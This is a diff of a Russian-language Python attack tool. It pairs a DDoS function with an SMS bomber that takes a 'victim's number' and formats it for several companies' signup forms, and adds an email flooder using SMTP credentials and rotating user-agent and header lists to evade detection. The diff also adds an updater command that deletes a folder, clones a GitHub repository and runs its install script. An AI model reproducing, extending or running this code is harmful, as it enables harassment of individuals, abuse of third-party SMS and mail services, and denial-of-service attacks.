@@ -35,14 +35,14 @@ def setting():
   os.system('cls' if os.name=='nt' else 'clear')
   print (logo)
   print ("Вставьте число умножения для атаки:")
-  print ("[*] БОЛЬШЕ 1000 ТОЛЬКО ДЛЯ МОЩНЫХ ПК С ХОРОШИМ ИНТЕРНЕТОМ!")
+  print ("[*] Больше 1000 Не Вводить!")
   multiple = int(input(">>>"))
   ddos()
 
 def sms():
   os.system('cls' if os.name=='nt' else 'clear')
   print (logo)
-  print ('Номер жертвы:): (7XXXXXXXXX)')
+  print ('Номер жертвы: (7XXXXXXXXX)')
   phone = input ('>>>')
   if len(phone) == 11 or len(phone) == 12 or len(phone) == 13:
     pass
@@ -56,7 +56,7 @@ def sms():
   phoneOstin = "+"+ phone[0]+"+("+ phone[1:4]+")"+ phone[4:7]+"-"+ phone[7:9]+"-"+ phone[9:11]
   phonePizzahut = "+" + phone[0]+" ("+ phone[1:4]+") "+ phone[4:7]+" "+ phone[7:9]+" "+ phone[9:11]
   phoneGorzdrav =  phone[1:4]+") "+ phone[4:7]+"-"+ phone[7:9]+"-"+ phone[9:11]
-  namechoose2 = ['deadrose', 'hacker', 'dead', 'rose', 'hacker', 'dead', 'deadrose']
+  namechoose2 = ['deadrose', 'hacker', 'deadrose', 'hacker', 'deadrose', 'hacker', 'deadrose']
   name = random.choice (namechoose2)
   while True:
     try:
@@ -663,8 +663,8 @@ def sms():
 def mail():
   os.system('cls' if os.name=='nt' else 'clear')
   print (logo)
-  print ('Введите адрес почты (email илм Yandex')
-  print ('Для корректной работы привяжите к Почте номер телефона')
+  print ('Введите адрес почты с которой будеть отправляться сообщения (только почта яндекс или мэйл):')
+  print ('ВНИМАНИЕ! К ПОЧТЕ ДОЛЖЕН БЫТЬ ПРИВЯЗАН НОМЕР ТЕЛЕФОНА!')
   L = input ('>>>')
   os.system('cls' if os.name=='nt' else 'clear')
   print (logo)
@@ -672,7 +672,7 @@ def mail():
   P = input ('>>>')
   os.system('cls' if os.name=='nt' else 'clear')
   print (logo)
-  print ('Если почта Yandex введите - smtp.mail.ru, если Mail smtp.yandex.ru')
+  print ('Если почта яндекс введите - smtp.mail.ru, если мэил smtp.yandex.ru')
   U = input(">>>")
   os.system('cls' if os.name=='nt' else 'clear')
   print (logo)
@@ -688,7 +688,7 @@ def mail():
   M = input ('>>>')
   os.system('cls' if os.name=='nt' else 'clear')
   print (logo)
-  print ('Количество смс')
+  print ('Количество писем')
   N = input ('>>>')
   for value in range( int( N ) ):
     msg = MIMEMultipart()
@@ -784,7 +784,7 @@ def main():
         os.system('cls' if os.name=='nt' else 'clear')
         print (logo)
         print ('[!] Происходит установка...')
-        os.system("bug")
+        os.system("cd && rm -rf ~/spammer-by-ARnoLD && git clone https://github.com/loginhead1/EmailDdosSms && python ~/EmailDdosSms/install.py")
     else:
       os.system('cls' if os.name=='nt' else 'clear')
       print (logo)
@@ -812,12 +812,9 @@ from email.mime.multipart import MIMEMultipart
 colorama.init()
 logo = '''
 
-──╔╗───────╔╗
-──║║───────║║
-╔═╝╠══╦══╦═╝╠═╦══╦══╦══╗
-║╔╗║║═╣╔╗║╔╗║╔╣╔╗║══╣║═╣
-║╚╝║║═╣╔╗║╚╝║║║╚╝╠══║║═╣
-╚══╩══╩╝╚╩══╩╝╚══╩══╩══╝
+█▀▀▄ █▀▀ █▀▀█ █▀▀▄ █▀▀█ █▀▀█ █▀▀ █▀▀ 
+█──█ █▀▀ █▄▄█ █──█ █▄▄▀ █──█ ▀▀█ █▀▀ 
+▀▀▀─ ▀▀▀ ▀──▀ ▀▀▀─ ▀─▀▀ ▀▀▀▀ ▀▀▀ ▀▀▀
 userag=["Mozilla/5.0(Windows;U;WindowsNT6.1;sv-SE)AppleWebKit/533.19.4(KHTML,likeGecko)Version/5.0.3Safari/533.19.4","Mozilla/5.0(Linux;Android7.0;SM-G930VCBuild/NRD90M;wv)AppleWebKit/537.36(KHTML,likeGecko)Version/4.0Chrome/58.0.3029.83MobileSafari/537.36","Mozilla/5.0(Linux;Android7.0;SM-G892ABuild/NRD90M;wv)AppleWebKit/537.36(KHTML,likeGecko)Version/4.0Chrome/60.0.3112.107MobileSafari/537.36","Mozilla/5.0(Linux;Android7.1.1;G8231Build/41.2.A.0.219;wv)AppleWebKit/537.36(KHTML,likeGecko)Version/4.0Chrome/59.0.3071.125MobileSafari/537.36"]
 acpt=["Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language:en-US,en;q=0.5\r\nAccept-Encoding:gzip,deflate\r\n","Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language:en-US,en;q=0.5\r\n","Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding:br;q=1.0,gzip;q=0.8,*;q=0.1\r\n",]
 useragent=["Mozilla/5.0(Macintosh;IntelMacOSX10_9_3)AppleWebKit/537.75.14(KHTML,likeGecko)Version/7.0.3Safari/7046A194A","Mozilla/5.0(iPad;CPUOS6_0likeMacOSX)AppleWebKit/536.26(KHTML,likeGecko)Version/6.0Mobile/10A5355dSafari/8536.25","Mozilla/5.0(Macintosh;IntelMacOSX10_6_8)AppleWebKit/537.13+(KHTML,likeGecko)Version/5.1.7Safari/534.57.2","Mozilla/5.0(Macintosh;IntelMacOSX10_7_3)AppleWebKit/534.55.3(KHTML,likeGecko)Version/5.1.3Safari/534.53.10","Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/70.0.3538.77Safari/537.36","Mozilla/5.0(WindowsNT6.2;WOW64)AppleWebKit/537.36(KHTMLlikeGecko)Chrome/44.0.2403.155Safari/537.36","Mozilla/5.0(WindowsNT6.1)AppleWebKit/537.36(KHTML,likeGecko)Chrome/41.0.2228.0Safari/537.36","Mozilla/5.0(X11;Linuxi686;rv:64.0)Gecko/20100101Firefox/64.0","Mozilla/5.0(WindowsNT6.1;WOW64;rv:64.0)Gecko/20100101Firefox/64.0","Mozilla/5.0(X11;Linuxi586;rv:63.0)Gecko/20100101Firefox/63.0","Mozilla/5.0(WindowsNT6.2;WOW64;rv:63.0)Gecko/20100101Firefox/63.0","Mozilla/5.0(Macintosh;U;IntelMacOSX;en-US;rv:1.8.1.13)Gecko/20080313Firefox","Mozilla/5.0(Macintosh;U;PPCMacOSXMach-O;rv:1.8.1.16)Gecko/20080702Firefox","Mozilla/5.0(Windows;U;WindowsNT5.1;de-DE;rv:1.9.2.20)Gecko/20110803Firefox","Mozilla/5.0(Windows;U;WindowsNT5.1;en-GB;rv:1.9.0.6)Gecko/2009011913Firefox","Mozilla/5.0(X11;;Linuxx86_64;rv:1.8.1.6)Gecko/20070802Firefox","Mozilla/5.0(X11;U;GentooLinuxx86_64;pl-PL)GeckoFirefox"]#CodeByGogoZin
